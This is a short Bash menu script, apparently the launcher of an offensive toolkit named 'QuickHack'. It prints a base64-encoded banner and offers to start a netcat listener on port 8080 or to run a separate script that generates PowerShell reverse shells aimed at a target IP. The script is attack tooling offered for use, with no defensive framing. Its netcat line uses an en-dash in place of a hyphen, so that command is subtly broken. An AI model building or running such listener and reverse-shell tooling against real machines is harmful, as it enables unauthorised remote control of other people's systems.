cls
base64 -d <<<"ICAoKCAgICAoICAgICAoICAoICAgKCAoICAgKCAgICggICggICAKICApKVwgICApXCAgKCAoXCApXCAgKVwpXDogKVwgIChcIClcICAKICgoXykpICgoXykgKVwoXCgoXykoXykoXykoXygpIChcKChfKSAKKC8gXyBcKChfKSkoXykoICkgfF9fIHx8IHwoXykoKSggKSB8X18KfCAoXykgfCB8fCB8IHwgX3wgLyAvIF9fIHwgX2AgfCBffCAvIC8KIFxfX1xfXFxfLl98X3xfX3xfXF9cX3x8X3xfXy9ffF9ffF9cX1wK"
PS3='linux@QuickHack '
options=("Setup Listner" "Reverse Shell Generator" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Setup Listner")
            nc –lvnp 8080
            ;;
        "Reverse Shell Generator")
            bash shelly.sh -h $IP -p 8080 -l powershell
            ;;
        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
